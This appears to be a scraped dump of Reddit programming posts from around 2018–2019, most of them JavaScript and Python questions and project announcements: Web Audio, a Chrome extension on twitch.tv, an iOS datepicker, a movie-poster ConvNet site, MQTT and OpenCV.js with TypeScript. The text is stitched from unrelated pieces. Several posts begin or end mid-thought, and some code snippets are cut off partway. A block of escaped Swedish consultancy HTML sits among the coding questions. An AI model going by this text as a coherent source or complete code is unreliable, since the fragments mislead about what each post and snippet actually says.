Note: I am not looking for a separate player, where the user makes one music file play. I want the user to click, then my game will generate background music out of a small number of notes. Basically a super-simple implementation of MIDI. All I need is a very simple, reliable way to play a single note. Please help!",simplest web audio implementation?

there's a bug in my jscript for my website. The way to reproduce it is by clicking the links in the static header. After clicking the links multiple times, when scrolling, you put onto the anchors when scrolling and it gets really buggy and scrolling is unbearable.

                                &lt;p&gt;Garbrant Consulting erbjuder tjänster inom en rad områden, som rådgivare, projektledare eller resurs i en arbetsgrupp:&lt;/p&gt;

                                &lt;p&gt;&lt;strong&gt;Konceptutveckling&lt;/strong&gt;&lt;br&gt;Ett koncept är en helhet med många beståndsdelar. Garbrant Consulting kan bidra med kreativitet, marknadskännedom, trendkänsla, specialistkunskap och ett strukturerat arbetssätt för att utforma alla detaljer i konceptet. Garbrant Consulting kan även utvärdera befintliga koncept och utforma förbättringsförslag.&lt;/p&gt;
                                &lt;p&gt;&lt;strong&gt;Analyser&lt;/strong&gt;&lt;br&gt;En analys kan vara ett avgränsat projekt, t ex en kvalitetsutvärdering, marknadskartläggning eller trendrapport. Ofta är analysen en del i ett större projekt, t ex en förstudie inför ett strategiarbete eller ett underlag för konceptutveckling.&lt;/p&gt;
                                &lt;p&gt;&lt;strong&gt;Strategiarbete&lt;/strong&gt;&lt;br&gt;Vision, affärsidé, mål, vägval och strategier - Garbrant Consulting kan hjälpa er att skapa en strategisk plan för ert företag, affärsområde eller avdelning. Exempelvis är utvecklingen av en affärsplan en intern process som kan förstärkas och effektiviseras med Garbrant Consultings hjälp. Garbrant Consulting kan också fungera som bollplank och kritisk granskare av föreslagna strategier.&lt;/p&gt;
                            &lt;/td&gt;

Syften med att skapa strukturkapital är kvalitetssäkring,  effektivisering av processer och daglig drift, konceptsäkring vid  expansion, uppföljning av prestationer mm. Ett väl utformat  strukturkapital ökar värdet på företaget. Ofta fungerar ett  strukturprojekt som en arbets- och utvecklingsprocess då det ibland  uppdagas att alla policies, konceptdetaljer och rutiner inte  är satta. Därför krävs en erfaren och kvalificerad projektledare för  att nå ett bra slutresultat. Exempel på slutprodukter:  Konceptbeskrivning, Driftsmanual, Franchisehandbok,  Utbildningsprogram.&lt;/p&gt;

                                &lt;p&gt;&lt;strong&gt;Arbetssätt&lt;br&gt;&lt;/strong&gt;En projektgrupp sätts samman bestående av Garbrant Consulting och en eller flera representanter från ert företag. Roller och ansvarsfördelning bestäms i uppstartfasen. Beroende på uppdragets art och vilka interna resurser som kan tillsättas, väljer ni som uppdragsgivare hur mycket ni deltar. Garbrant Consulting konsult kan anta rollen som projektledare eller producerande resurs i en arbetsgrupp som ni själva tillsatt.&lt;/p&gt;
                                &lt;p&gt;Vi tror på kombinationen passion, struktur och affärsmässighet för bästa resultat. Garbrant Consulting kan stärka uppdragsgivaren på en eller flera av dessa punkter.&lt;/p&gt;
                                &lt;p&gt;Begreppet passion innefattar både kreativitet, kunskap, vilja och drivkraft. Den brukar vara en stark faktor hos entreprenören, som kanske i första hand behöver hjälp med struktur. I en större organisation finns ofta en högre grad av struktur och affärsmässighet men kanske ett behov av en utomståendes drivkraft, kunskap och kreativitet.  Ibland är uppdragsgivaren stark på alla tre punkter men saknar helt enkelt tid och interna resurser för ett önskat projekt.&lt;/p&gt;
                                &lt;p&gt;&lt;strong&gt;Vad behöver ni hjälp med? &lt;/strong&gt;&lt;br&gt;&lt;a href=""#contact""&gt;Kontakta oss&lt;/a&gt;&lt;/p&gt;

The thing we do most often when we work on a React project, is to create folders and files, and in each file we have more or less the same structure: import - content - export.   
So I created [Lazerpath](https://www.npmjs.com/package/lazerpath), a node package that does exactly the same thing for me.

Lazerpath helps you to scaffold new projects, starting from a javascript object.

Here's a quick example

&amp;#x200B;

**1. Create a template file (optional):**

It can be anything, js, css, php etc..

https://i.redd.it/mlcoi8mukyz11.jpg

**2. Create the lazerpath config file**

As you can see the template is assigned to multiple file.  
In the Nav.js file, Lazerpath will search and replace 'MY\_COMPONENT' and 'Title' with 'Nav' and 'Nav Title'

https://i.redd.it/saxohul1lyz11.jpg

**3. Run lazerpath from terminal**

If a file or a folder already exists, it will be skipped, so you can safely run Lazerpath anytime you want.

https://i.redd.it/mhtbunkxlyz11.jpg

**THE** **END**

&amp;#x200B;

Now you got this:

https://i.redd.it/7zihixa2myz11.jpg

And if you check the Nav.js file it will look like this:

https://i.redd.it/rk1jayx8myz11.jpg

&amp;#x200B;

If you run ""lazerpath -t"" a test will be performed, and no file or folder will be created.

I Googled a lot, read a lot of stackoverflow questions, asked on r/javascript and /r/webdev, non of the suggestions I've been given worked. It was just failure after failure.

It's astonishing to me that the chromium devs didn't bother to add an event for this function, like it would've been so handy -- especially for browser extension developers like me.

The reason I've been trying so hard to solve this problem is because, I have a chrome extension that places a download button on the site twitch.tv. It works as intended when the page initially loads, but when I try to load another page, it uses Ajax loading (history.pushState).

So basically, the relevant part of the HTML document gets replaced by the new page... as a result my button download disappears, rendering the extension useless. That's where issue is, the browser never re-runs the extension when history.pushState() is called, leaving my users with no choice but to reload the page so the extension starts working again.

My ideaa was, if I could know exactly when **history.pushState()** is called, I could manually re-run the extension without having to reload. I thought it was as easy as...

    addeventlistener('onpushstate', function () {run()})

2237,2018-11-27 13:49:25,54,1,"Hi guys,

You might like a long-term project I try to build. It is a
datavisualization that aims to cluster movie posters and propose the ''closest'' movie
poster.

The project is divided into two part:

* [a search engine](https://movies.iwoaf.com/index_complete.html) that allows you to find
  the closest posters of a particular movie (have fun with the random button)..
* [a scatter plot](https://movies.iwoaf.com/) representing 1500 randomly picked movie posters into a 2D spaces.

Don't forget that, for both of the webpages, you can click on any movie poster to get its closest posters.


**General idea:**

I thought you'd be interested in a little experiment with the ConvNets. I gain interest in
deep-learning 2 years ago and quickly wanted to exploit the power of Deep Convolutional
Neural Network.

But first, one can estimate the ''distance'' between two images by subtracting the value for each
pixels and compute some sort of euclidean distance... However it will failed most of the
time (as for example if you slightly shift an image the distance with itself can be huge
!!!). So ''close'' images can be translate as ''similar'' shapes/motifs/textures included
in both of the images. There is of course a lot of more effective solutions such as
[pHash](http://www.phash.org/) or image-maching based on Fourier transform but I'd doubt
it will give satisfying results for a relatively small movie posters database.

This is where the power of deep learning occur as it is normally able to learn
[**invariant
features**](https://www.quora.com/How-is-a-convolutional-neural-network-able-to-learn-invariant-features). The
idea is to use ConvNet as features extractor that will map images into fixed meaningful
size vectors in which we will be able to use to compute distances between each others.

So basically, you take the output of a pre-trained ConvNet for all the images and then
compute distances between each images.

I will not bother you more with the details as I wrote a blog post about it. (it might no
longer be exactly what I did but It was written 2 years ago).

**Cherry Picking:**

All those words to give you some cherry peak example of what the algorithm consider to be
similar:

* [Rock'n'Roll High School (1979)](http://iwoaf.com/content/images/2017/04/7135_500.jpg)

**Sofware/Library used:**

Most of the project is based on python:

* data processing: [keras](https://keras.io/), [sklearn](https://scikit-learn.org/stable/), [Pillow](https://pillow.readthedocs.io/en/5.3.x/), [numpy](http://www.numpy.org/)
* backend: [flask](http://flask.pocoo.org/), flask-restful
* frontend: html, css, [d3js](https://d3js.org/), javascript is a pain guys!
* data-storage: Postgresql

By the way the data processing needs a relatively powerful computer (~32Go of RAM and a GPU
for the ConvNet part).

The datavisualizations are hosted on a VPS from [scaleway](https://scaleway.com).

**The code:**

The code is available on [github](https://github.com/adrz/movie-posters-convnet) feel free
to use it, criticize it. The code is probably not fully functional but I constantly pushed
away its promotion because of my insecurity with it.","I made a flask website to find similar movie posters, hope you'll like it, it is mostly python !"
2238,2018-11-27 15:10:24,4,1,"I'm reading alot about kotlin native and it looks awesome. I code apps with expo+react-native, one thing expo does is provide an abstraction from ios and android sdk's.  For example, a generic camera module you can use in code rather than coding to platform specific sdk's.  Or for example you dont write an andoird actibvity and ios veiw in seperate ways, you write 1 veiw which gets compiled into an ios + android app. 

From what I read the kotlin native multiplatform stuff allows the writing of ios + android apps in kotlin, allows the sharing of common kotlin modules (e.g. MyFancyMathLib.kt) but you still effectivly need to write 2 apps, the IOS one making ios views and whatnots, accessing the ios camera etc and a second one for android to access the android specific things.

Anyone know of any expo like libraries built or being built ontop of the kotlin multiplatform stuff that can abstract away some of the multiplatform sdk pains so that you can have 1 codebase, i.e. defining 1 view that produces the 2 apps. Like  Expo with kotlin not javascript essentially.

I am making a spring boot application and working with HTML to update my view. Here I am trying to implement native datepicker using `\`input type date\`` in a html form where user will select date and then the page will refresh and submit form with selected date as url parameter. 

The textbox in the form will also display the value selected in datepicker in the format I require after page refresh.  

Its made in such a way that **there should not be submit button** to submit form and once the user selects date from `\`input\`` field, the page should automatically refresh and save value in url parameter as well as in text box in form.  

below is my code:

&amp;#x200B;

HTML:

`&lt;form action=""#"" id=""myForm"" method=""get""&gt;`

`&lt;input type=""text"" id=""save-date"" name=""show_date"" class=""form-control""&gt;` 

`&lt;input type=""date"" onchange=""changeDateFormat()"" name=""date"" class=""form-control""&gt;&lt;/input&gt;`

`&lt;/form&gt;`

`&lt;script type=""text/javascript""&gt;`

`function changeDateFormat(){`

`var received_date = document.getElementById(""date-input"").value;`

`var split_dashes = received_date.split('-');`

`var final_date = split_dashes[2]+'.'+split_dashes[1]+'.'+split_dashes[0]`

\*\*My Problem\*\*

This works great on all the platforms except ios/iphone 8. On ios/iphone 8 as soon as i click input type date field, datepicker immediately opens and quickly refreshes the page. I expect it to wait for my input but it doesn't allow me. instead it quickly invokes js function and refreshes the page.

i dont face this in chrome or any other browser. In chrome datepicker will open as calendar and it will wait for me to select date. 

&amp;#x200B;

\*\*What I tried\*\*

I tried whole night and half of my today to understand why it happens. It seems in ios datepicker it quickly selects date as soon as i click to open dropdown picker. Apart from that i tried implementing jquery function but it works the same way. I also tried `\`onselect\`, \`oninput\`` but nothing works.

I am beginner in javascript and this is making me go crazy from last night. I am very close to get it working but feels yet so far away. 

&amp;#x200B;

\*\*My Approach\*\*

One approach to tackle this problem is on carefully observing datepicker in iphone i found out that it immediately selects date as soon as i open datepicker in the phone, and maybe that's why it invokes javascript function. 

However if it can wait for me to select the date until i press ""Done""(its there in iphones) in datepicker, this problem can be eliminated

2274,2018-12-08 03:01:36,7,1,"I know this question's probably been asked a lot (and answered with a depressing amount of jargon), but I want to be able to make a text-based adventure game that's accessible to all browsers.

So far, my best bet for that is with the triple threat of HTML, CSS, and JavaScript.

Now, all of my experience in programming is back-end. What inspired me to try and learn JavaScript was the fact that, after I created a moderately lengthy (and efficient) text adventure game in C# using the console, I couldn't send it to a friend who used a Mac (obviously, in retrospect).

Scouring the internet for JavaScript tutorials, I keep running into the same problem:

All of them revolve around the bare-bones basic concepts of ***programming as a whole***, not necessarily JavaScript's language. I know about recursion and arrays and if/then statements, but I don't know the actual *language* (i.e. the techno lingo) that's required to use JavaScript in literally any visible capacity. 

In terms of this text-based adventure game, my main problem lies with actually displaying text on a screen from the javascript file without adding one-hundred-thousand &lt;p&gt;s and .getElementById statements. In C#, this process is incomprehensibly (or, should I say, *comprehensibly*) simple. So much so, in fact, that text-based adventure games are seen as a good exercise to start off programming in C#. 

# My question, ultimately, is this:

Is there a way to take the returns that JavaScript provides and display them on a canvas ***in a way that somebody who doesn't know the secret handshake can understand?***

To be more specific *(because, from my research, programmers hate vague questions)*:

Here's a snippet of code:

\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

function enemyEncounter (name, descriptor, health) {

console.log(""Holy smokes! It's a "" + name + ""! "" + descriptor"");

console.log(""It's got "" + health + ""health total! 

How will we ever get out of this tense, teeth-gritting scenario?"");

}

enemyEncounter(""Generic Fantasy Monster!"", ""It's in the name, really..."", 100);

&amp;#x200B;

//*Disclaimer: I know that I can't use ""console.log"" and have it apply in HTML.* 

//*That's just an example...and the only one I really know for certain how to use.*

\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

This seems pretty straight-forward. I know that certain things can be ""drawn"" inside an HTML canvas, but how exactly would I go about executing the above code within it? If I can solve this mystery, then it'll make the rest of my job that much easier. That, and whatever the javascript equivalent of console.clear is.

Lastly: Don't just link me to a ""Learn JavaScript"" resource passive-aggressively. I don't care how many books are written or YouTube tutorials with horrible audio quality are made concerning the language. I'm not about to go scrubbing through hours of content to learn how to understand one (apparently not-so-simple) concept. I've already looked at several lengthy tutorials (and completed them, with exercises) and none of them have elaborated enough on the client-side, graphical aspects of the language and how they integrate with HTML and CSS.

Probably you're all familiar with javascript validation libraries like validator.js, Joi or AJV. They are all great, but they have their own shortcomings:

* if the library is nice and simple, it can't handle complex scenarios (validating objects by schema, chained validators etc)
* if it can do schema-based validation, it's either slow or extending it with your own validators is not very straightforward
* if it's fast, it requires an additional schema compilation step.

easevalidation is a new validation library that takes a different approach. It's mostly functional and adding your own validators is dead simple as long as you have a function that can return a boolean result - [https://github.com/viczam/easevalidation/blob/master/\_\_test\_\_/createValidator.test.js#L8](https://github.com/viczam/easevalidation/blob/master/__test__/createValidator.test.js#L8)

&amp;#x200B;

It can validate scalars, objects by schema, you can use chained validators, the errors returned have enough information to display nice error messages and comes pre-bundled with a big number of validators.

Questions about JavaScript on technical interview are not easy. I admit it, you admit it and, everyone does. The number of possible questions that could be asked in a JavaScript interview are high. In this article you will see the TOP 5 popular questions for different levels of knowledge in JavaScript language.

#### 1. What is Scope in JavaScript? (Junior)

In JavaScript, each function gets its own *scope*. Scope is basically a collection of variables as well as the rules for how those variables are accessed by name. Only code inside that function can access that function’s scoped variables.

A variable name has to be unique within the same scope. A scope can be nested inside another scope. If one scope is nested inside another, code inside the innermost scope can access variables from either scope.

#### 2. What is a Polyfill? (Mid)

A polyfill is essentially the specific code (or plugin) that would allow you to have some specific functionality that you expect in current or “modern” browsers to also work in other browsers that do not have the support for that functionality built in.

* Polyfills are not part of the HTML5 standard
* Polyfilling is not limited to Javascript

#### 3. Provide some examples of non-bulean value coercion to a boolean one (Senior)

The question is when a non-boolean value is coerced to a boolean, does it become `true` or `false`, respectively?

The specific list of “falsy” values in JavaScript is as follows:

* `""""` (empty string)
* `0, -0, NaN` (invalid number)
* `null, undefined`
* `false`

Any value that’s not on this “falsy” list is “truthy.” Here are some examples of those:

* `""hello""`
* `42`
* `true`
* `[ ], [1, 2, 3]`  (arrays)
* `{ }, { a: 42 }` (objects)
* `function foo() { .. }` (functions)

#### 4. Explain what is hoisting in Javascript (Expert)

Hoisting is the concept in which Javascript, by default, moves all declarations to the top of the current scope. As such, a variable can be used before it has been declared.

Note that Javascript only hoists declarations and not initializations.

#### 5. When would you use the “bind” function? (Expert)

The bind()  
 method creates a new function that, when called, has its `this` keyword set to the provided value, with a given sequence of arguments preceding any provided when the new function is called.

A good use of the `bind` function is when you have a particular function that you want to call with a specific this value. You can then use `bind` to pass a specific object to a function that uses a `this` reference.

    function fullName() {
 return ""Hello, this is "" + this.first + "" "" + this.last;
}
    console.log(fullName()); // =&gt; Hello this is undefined undefined
    // create a person object and pass its values to the fullName function
var person = {first: ""Foo"", last: ""Bar""};
console.log(fullName.bind(person)()); // =&gt; Hello this is Foo Bar

&amp;#x200B;

Currently it is useful for me but I will gladly add more features if they make sense.

&amp;#x200B;

The package is called `x-match-expression`. To install it, you can use:

`npm install x-match-expression`

And then import the match function if you are using a bundler like webpack

 `import {match} from ""x-match-expression"";` 

Or require it if using node

 `const {match} = require(""x-match-expression"");` 

Or you can use it directly in a browser with script tag like:

 `&lt;script src=""https://unpkg.com/x-match-expression/dist/browser/index.js"" type=""application/javascript""&gt;&lt;/script&gt;` 

and then use the '`match`' global function.

&amp;#x200B;

The repository is located at [https://github.com/x-match-expression/x-match-expression-js](https://github.com/x-match-expression/x-match-expression-js) in case you want to see the code.

&amp;#x200B;

Right now it lacks some tests and documentation (that will be added in the future), but because it has 'types' I think it can be used without much problem in any decent code editor.

2298,2018-12-13 00:47:10,3,1,"What's up fellas/ gals -

I'm writing a script that reads form a CSV file with site, username, and password.  The script executes using Selenium to open a browser window, request each site, send the username/password to the appropriate input elements, and finally submits the form to login.

Obviously, the login forms' structure varies greatly: some sites have the login elements on the home page, some have drop downs that redirect to a separate URI with the username/password elements, etc.

Any tips on how to automate finding these elements? I'm have a feeling  the script would have to be fairly sophisticated  in order to identify the login elements on any given site due to the variance  (regex, implementing javascript execution, creating numerous functions to handle different scenarios, etc)  ...

...Unless there are any patterns that help identify these login elements more efficiently.

Any ideas/tips? Thank you!",Locating username/password HTML elements/forms automatically
2299,2018-12-13 05:53:03,1,1,"**Issue:** I have a sidebar that toggles when clicked (goes away to left) but sometimes i notice, for instance when i click a link and go back in browser - and then click the toggle button, it will do this instead of toggling:

&amp;#x200B;

[http://localhost:3000/dashboard#menu-toggle](http://localhost:3000/dashboard#menu-toggle)

&amp;#x200B;

And then not toggle. If i reload the page, it still won't work (reloading with and without ""#menu-toggle""). I will need to leave the dashboard layout, go to homepage, and back to dashboard, for it to work.  

&amp;#x200B;

BTW, the sidebar is a section for admins and a separate layout.  

&amp;#x200B;

I'm using ruby on rails to.

&amp;#x200B;

It doesn't happen a lot, but it will randomly happen when I'm going through the dashboard layout.

&amp;#x200B;

This is the javascript:

&amp;#x200B;

    &lt;script&gt;
    
              $(function(){
               $(""#menu-toggle"").click(function(e) {
                   e.preventDefault();
                   $(""#wrapper"").toggleClass(""toggled"");
               });
    
               $(window).resize(function(e) {
                 if($(window).width()&lt;=768){
                   $(""#wrapper"").removeClass(""toggled"");
                 }else{
                   $(""#wrapper"").addClass(""toggled"");
                 }
               });
             });
    
    &lt;/script&gt;

&amp;#x200B;

What could possibly be creating this issue?

&amp;#x200B;

I took this sidebar template and created my own from it, but i haven't changed much: [https://bootsnipp.com/snippets/7np2j](https://bootsnipp.com/snippets/7np2j)

&amp;#x200B;

Other than that issue, it works fine.

&amp;#x200B;

&amp;#x200B;

A few notes:

&amp;#x200B;

I have read it can be because the page hasn't fully loaded, but this isn't the case apparently because it happens even after i allow it to load, give it a few seconds, and then try.

&amp;#x200B;

&amp;#x200B;

2302,2018-12-15 02:39:27,4,1,"Hey /r/javascript 

I recently started a job where I need to learn JavaScript, but there’s so many facets to it that I’m not entirely sure where to begin.

Obviously there’s JavaScript itself, which is mostly fine (though I’ll be honest, probably my least favorite language I’ve had to work with so far), but then there’s things like npm, yarn, node, react, flow, babel, etc.
In addition, it seems like I need to have at least a rudimentary understanding of css as well.

This all feels like quite a high barrier of entry and besides the language itself, I’m not entirely sure where to begin.

My name is Maksim and right now I'm working on a website intended to help to improve development skills by working on pet projects.

## The problem

Right now almost everybody learns new technology by reading books or watching video courses. After reading a few books or watching a few courses (even courses by Wes Bos) developers cannot get a project on upwork.com or get an offer from a company because of lack of practice and finished projects. Only a good solution that pops up in my head is working on pet projects but we have a problem here too. Before building a pet project usually you have:

1. Come up with an idea.
2. Think over whole functionality and logic of it.
3. Create a design for it.

Every point in this list takes time and disturbs from the most important thing - practice.

## The solution

The solution that I came up with is to create a website with a list of pet projects that already have thought over functionality and logic and ready design so every developer could just choose the project they are most interested in, read all the information about it and how everything should work, download the design and just start working without focusing on anything else.

To be honest, I would give a lot only to get access to such website when I was only at the start of my way. What about you?

A common way organizations make this decision is to have a “bake-off’ competition; a reference application implemented in one or more frameworks to see it in action.

[This post](https://keyholesoftware.com/2018/12/05/javascript-bake-off-angular-react-and-vue/) introduces the Now-Playing reference app developed three times using React, Vue &amp; Angular. 

Now-Playing displays movies currently at the theater and allows users to view, search, and rank motion pictures. It is robust enough to give good insight into many features that enterprise-level teams might need.","Bake-Off: Angular, React, &amp; Vue - Same App Built Three Ways"
2313,2018-12-18 01:07:30,10,1,"Hi experts,

I'm working on a dashboard project for my company. Requirements:

1) Scrape 3 values for each of 5 major products from internal web application (Reason to scrape is that I do not have access to database) **hourly**

2) Store hourly data in whatever file (considering csv first and maybe a small SQLite3 database in the future for practice)

3) Create an interactive dashboard (considering a multi-line plot showing 3 values of one product + button to change product)

4) Show the dashboard on a local server and make sure that internal users can see it in a web browser

&amp;#x200B;

Now I have finished the technical part of step 1), very easy with **requests** and **json** libraries. Step 2) seems to be easy as well, maybe I'll store the data in 5 separate files + daily folder.

However I have zero experience creating Pythonic dashboard and setting up a local server. I did some research and it seems that **Plotly** (with **Dash** and **Flask** included in the same package) can achieve what I want. 

&amp;#x200B;

Question:

I'm wondering if anyone has experience with similar projects and how did you solve them? I'm willing to learn anything that is helpful (e.g. javascript for Flask), and the broader its usage is the merrier. Thank you!",What opinions do I have for showing dashboards on local server?

My question is regarding how to approach creating interactive content on a web site in the best way. On w3schools they have a lesson on how to create a ""modal box"" that appears and disappears when you click certain html elements. They build the box and the content in html and set the default display setting to display: none so it is invisible and then use javascript to change it to display: block when you click an element.

Over on MDN they have a lesson example where they create a custom alert box. They use a JavaScript function to create all the html for the box when the function is invoked and set a evenlistener to trigger to the function, then another eventlistner to remove the alert box via removeChild() that deletes? it.

I'm wondering: which one is the prefered method? In terms of performance and maybe other factors?

        let close = document.createElement('button');
          close.setAttribute('class', 'button');

          close.innerHTML('x');

returns the error: close.innerHTML is not a function. I've seen this or close.textContent() used to put text in between html tags in many examples what am i doing wrong? I can solve it by creating a new textnode and appending it to close but i'm just wondering why innerHTML and textContent isn't working.

What I plan to do are

1) Read https://addyosmani.com/largescalejavascript/

2) Read https://reactjs.org/

There are 2 questions in my mind.

1) For the JavaScript app, should it download SQLite file and images from Google Drive, to user local computer, then use https://github.com/kripken/sql.js to read the local SQLite file? However, from sql.js documentation, it seems there's no way to persist the changes back to SQLite file (export the created database as a javascript typed array). So, what is the strategy to write the changes back to SQLite file and re-upload again to Google Drive?

Or, should I have a back-end server, to perform all the download/read/write SQLite file operation, and then expose such operations as API. My JavaScript app will then utilize those API, to read/write SQLite file, via JSON respond/request?

2) Should I deploy the app as a JavaScript web app, or a desktop app using https://electronjs.org/ ? Is there any catches I need to aware of?

From a code maintenance standpoint, this seems like a blatant violation of DRY. Even if I just use object literals instead of my factory function. If a new property gets added to Item, then I need to update all the Object literal's and factory functions in my codebase.

In Norway, even the biggest newspaper [VG.no](https://VG.no) does this. It's always a generic button, so if there are no comments they still make you click the button, only to get an empty div.  


I think parts of this comes from using facebook for comments, and the lack of control of comments for the local javascript. Parts of it probably come from the newspaper wanting to make comments less appealing to trolls.

2363,2019-01-02 16:38:27,2,1,"i am reading the book ""You don't know JavaScript : scope &amp; closures"" page 4/5 ,here is a quote:

    Back and Forth 
    When you see the program var a = 2;, you most likely think of that as one statement. But that’s not how our new friend Engine sees it. In fact, Engine sees two distinct statements, one that Compiler will handle during compilation, and one that Engine will handle during execution. So, let’s break down how Engine and friends will approach the program var a = 2;. The first thing Compiler will do with this program is perform lexing to break it down into tokens, which it will then parse into a tree. But when Compiler gets to code generation, it will treat this program somewhat differently than perhaps assumed. 
    A reasonable assumption would be that Compiler will produce code that could be summed up by this pseudocode: “Allocate memory for a variable, label it a, then stick the value 2 into that variable.” Unfortunately, that’s not quite accurate. Compiler will instead proceed as: 
    1. Encountering var a, Compiler asks Scope to see if a variable a already exists for that particular scope collection. If so, Compiler ignores this declaration and moves on. Otherwise, Compiler asks Scope to declare a new variable called a for that scope collection. 
    2. Compiler then produces code for Engine to later execute, to handle the a = 2 assignment. 
    The code Engine runs will first ask Scope if there is a variable called a accessible in the current scope collection. If so, Engine uses that variable. If not, Engine looks elsewhere (see “Nested Scope” on page 8). If Engine eventually finds a variable, it assigns the value 2 to it. If not, Engine will raise its hand and yell out an error! 
    
    To summarize: two distinct actions are taken for a variable assignment: First, Compiler declares a variable (if not previously declared) in the current Scope, and second, when executing, Engine looks up the variable in Scope and assigns to it, if found. 

so basically it says that JavaScript engine will search in the scope collection to find if a variable of the same name exist and use that instead of creating a new one. OK, to test this i wrote a sample code:

    var a = 1;
    console.log(""a outside = "" + a);
    
    
    function doIt()
    {
        var a = 2;
        console.log(""a inside = "" + a);
    }
    
    doIt();
    console.log(""a outside again = "" + a);

output:

    a outside = 1 
    a inside = 2 
    a outside again = 1

so var a = 2 actually created a new local variable .

I'm a frontend developer mostly focused on js and learning react.

I have 2 and a half years of working experience as a frontend developer. I love to learn but because I can't afford a mentor I need to be self-taught. So it's time to set proper goals for next year.

I know: ES6 features, but I don't know stuff like promises, generators iterators, decorators, weakmap, weakset. Simply because I never had a need to use them.

Http clients like axios and browsers fetch API.

Used libraries like visjs, momentjs.

Browser storage: localStorage, sessionStorage.

React: I know to create a simple project with crud operations, to connect with API and list items, to create routes. The only thing it's not crystal clear to me is new component update lifecycle methods.

React I don't know: is to properly plan project and to decide how I will organize where should a state be. I'll manage to do it it will work but it will be messy. Reason for this is I'm only working in React in my free time (for a year now) and I don't have someone more experienced to do me a code review.

I' have experience with working with basic authentication in react to maintain authenticated state over the app.

So this is a list just from the top of my head, but it gives a picture about what I think I know :)

So my goals (for now):

1) Read a book from Dr. Alex Rauschmayer exploring es6

2) React hooks (Still didn't touch it)

3) Algorithms and data structures in javascript.

4) Graphql (don't need it but it looks really interesting)

So my question is can anyone give any tip what is next I should learn? New language maybe like TypeScript (even there is no need for me to know it at current position) to give myself some intimidating project I'll work over the next year maybe? Focus more on javascript?

little disclosure i am new to python and fairly new to programming (did a bit of java in university 10 years ago, have done html, php, little javascript, and am advanced in t-SQL). Trying to learn python because i want to do data science but also wanting to do home automation which is where the MQTT stuff comes in. 

I am trying to write a script that receives an MQTT message using paho.mqtt.client then compare the message with the previos message 

this is what i have so far, using a tutorial that i found online

                # set the old location to the new location so that on the next loop it is using updated locations
                danny_old_location = danny_new_location

    client.loop_forever()
    
    
   

this loops forever and when we have a message it first checks the payload and categorizes it (eg. work, shopping, home). 

it then checks to see what the topic is, if it is danny then checks the location to the previous location to see if there is a change then i can do something if there is. 

the problem i have is that i dont know where to create the old_location. I think that it has to be a global variable so that it persists when the on_message function isnt being used, however if i declare it in the loop (eg danny_old_location = none) then every loop it would overwrite the value to none?

I hope this makes sense

2388,2019-01-07 12:25:47,15,1,"I want to write a website to to do some AR thing with the camera. So i am at the very beginning and want to calibrate the camera. I have a chessboard thing already printed etc.

&amp;#x200B;

For the language a decided to use typescript, since it should work very good in the browser etc.

&amp;#x200B;

I do not want a server backend. So everything should run in the browser!

&amp;#x200B;

I am a complete noob and all those weird javascript hacks make my head spin. Its so hard to differentiate between legit parts of the language, libraries and straight up hacks. Seems like all of them are just hacks built ontop each other. I am used to program in java, python, c and all the 'classic' language so the transition to the universe that is sometimes called javascript is very hard. Nothing makes sense! Importing code is sooo easy with every other language. Even C was more easy.

&amp;#x200B;

my work folder looks like this right now:

&amp;#x200B;

`$ tree .`

`.`

`├──` [`buildScript.sh`](https://buildScript.sh)

`├── code.js`

`├── code.ts`

`├── index.html`

`├── opencv.js`

`└── tsconfig.json`

&amp;#x200B;

code.ts is my own code. this is where i want to write my calibration code.

&amp;#x200B;

code.js is autogenerated from the command 'tsc code.ts' . This is the javascript code that typescript is creating.

&amp;#x200B;

tsconfig is a file that 'should' set options for the 'ts to js' translation. But if i change settings here i don't really see a difference in behaviour. How do i debug this?

&amp;#x200B;

opencv.js is a library. I needed to built it myself. It took a week at least but i managed to build all the 'modules' i needed from opencv. In a pure js experiment i could use the cv library but it broke when i tried to use it in my typescript file. So the opencv library works...

I was reading about opencv.d.ts which is a define file? Or something like a header for typescript? Do i need that?! If so, i have some modules in my opencv.js that are not in the 'official' opencv.js library. Can i even use a .d.ts file in this case? Do i have to write it on my own?

&amp;#x200B;

[buildScript.sh](https://buildScript.sh) is just a script . currently it has only this line:

`tsc code.ts`

&amp;#x200B;

Now my problem is:

How do i get all files to work together?

How do i import opencv.js? It is not a typescript library, so there might already be difficulties? All links in google for this are already purple since i read everything i could. But it seems like import is not a basic functionality of javascript/typescript language. All i see is hacks and errors in the stackoverflow results. there seems to be more than five ways to include code depending on many factors. I tried most of them but none worked. For example i tried to include the opencv.js with these lines in my code.ts file: 

&amp;#x200B;

`//import {cv} from ""./opencv"";`  
`//import * as cv from ""./opencv"";`  
`//var cvv: any = require('./opencv');`  
`//import cv from ""./opencv"";`

&amp;#x200B;

My index.html file is written as follows:

&amp;#x200B;

Its pretty basic and only has a div to show a live camera feed from the webcam and below that are two buttons. one to take a photo (newest photo is shon in a div) and one to start a calibration (which isn't implemented yet).

&amp;#x200B;

`&lt;!DOCTYPE html&gt;`  
`&lt;html&gt;`  
 `&lt;head&gt;`  
 `&lt;meta charset=""utf-8""&gt;`  
 `&lt;title&gt;Calibration with OpenCV.js&lt;/title&gt;`  
 `&lt;/head&gt;`  
 `&lt;body&gt;`   
   
   
 `&lt;div&gt;`  
 `&lt;!-- the field for the raw input cam --&gt;`  
 `&lt;div class=""inputoutput""&gt;`  
 `&lt;video id=""videoInput"" width=""320"" height=""240""&gt;`  
`Your browser does not support the video tag.`  
 `&lt;/video&gt;`   
 `&lt;/div&gt;`  
 `&lt;!-- video feed through openCV --&gt;`  
 `&lt;div&gt;`  
 `&lt;canvas id=""canvasOutput"" width=""320"" height=""240"" style=""border:1px solid #000000;""&gt;&lt;/canvas&gt;""`  
 `&lt;/div&gt;`   
 `&lt;/div&gt;`  
   
   
 `&lt;!-- load openCV --&gt;`  
 `&lt;script src='opencv.js' type='text/javascript'&gt;&lt;/script&gt;`  
   
 `&lt;!-- load our javascript code --&gt;`  
 `&lt;script src='code.js' type = 'text/javascript'&gt;&lt;/script&gt;`  
   
 `&lt;!-- a button. if pressed makes a screenshot --&gt;`  
 `&lt;button id='screenshotButton' &gt;screenshot&lt;/button&gt;`  
 `&lt;button id='calibrateButton'&gt;calibrate&lt;/button&gt;`  
   
 `&lt;/body&gt;`  
`&lt;/html&gt;`

So how do i INCLUDE a library into typescript? Why is it so immensly hard to do?

